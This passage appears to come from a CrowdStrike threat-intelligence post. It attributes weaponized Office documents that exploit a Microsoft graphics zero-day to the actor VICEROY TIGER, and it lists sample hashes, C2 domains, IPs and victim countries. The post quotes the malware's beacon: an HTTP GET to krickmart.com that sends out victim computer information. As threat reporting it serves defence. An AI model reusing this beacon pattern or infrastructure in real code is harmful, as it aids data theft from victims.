This announcement attracted\n[immediate interest from the security community; McAfee posted a blog detailing the sample](http://blogs.mcafee.com/mcafee-labs/mcafee-labs-detects-zero-day-exploit-targeting-microsoft-office-2)\nthat was related to the exploit activity. After analyzing several of the samples leveraging this\nnew vulnerability, the CrowdStrike Intelligence Team has attributed several of the malicious\ndocuments to the India-nexus adversary we have designated VICEROY TIGER. This is the\nfirst use of a zero-day vulnerability that has been associated with the VICEROY TIGER\nactor and may represent a new Tactic, Technique, and Procedure (TTP) that this actor may\nadopt moving forward. As this is the first fielded zero-day associated with this actor, it is\nalso possible the adversary purchased the exploit from an underground market.\n\nThe exploit leverages a vulnerability in the Microsoft graphics component and uses a large\nnumber of ActiveX files to conduct a heap spray. A number of related files have been\nidentified including: 97bcb5031d28f55f20e6f3637270751d,\n7671b6d1c73145bcc9de472d75b493e3, 88bf0a33451b257cadaab360629df745, and\nb44359628d7b03b68b41b14536314083.\n\n\n-----\n\nThree of the files identified above contain only the exploit code; however,\n97bcb5031d28f55f20e6f3637270751d was found to be fully weaponized with malware\nmaking a connection to krickmart.com via the following GET request:\n\nGET /logitech/rt.php?cn=[victim computer info] HTTP/1.1\nUser-Agent: WinInetGet/0.1\nHost: krickmart.com\nConnection: Keep-Alive\nCache-Control: no-cache\n\nThe structure of this GET request, specifically the User-Agent, is consistent with previous\nreporting on VICEROY TIGER malware. It appears that this C2 domain represents one\nstage of a multi-stage attack structure, and CrowdStrike is looking into possibly related\nmalware and command infrastructure. Additional related C2 infrastructure includes:\n_myflatnet[.]com, 37.0.125.77, 37.0.124.106, maptonote[.]com, appworldstores[.]com, and_\n_lampur[.]com._\n\nVictims observed thus far are from the following countries: Pakistan, India, Saudi Arabia,\nand Russia.\n\nFor more information on VICEROY TIGER, including detection logic or any of the\n[adversaries tracked by CrowdStrike, please contact:](http://twitter.com/CrowdStrike) [intelligence@crowdstrike.com and](http://10.10.0.46/mailto:intelligence@crowdstrike.com)\ninquire about our Intelligence subscription.\n\nRelated Content\n\n\n-----\n\nWho is EMBER BEAR?\n\n\n-----\n\nA Tale of Two Cookies: How to Pwn2Own the Cisco RV340 Router\n\nPROPHET SPIDER Exploits Citrix ShareFile Remote Code Execution Vulnerability CVE-2021-22941 to\nDeliver Webshell\n\n\n-----",
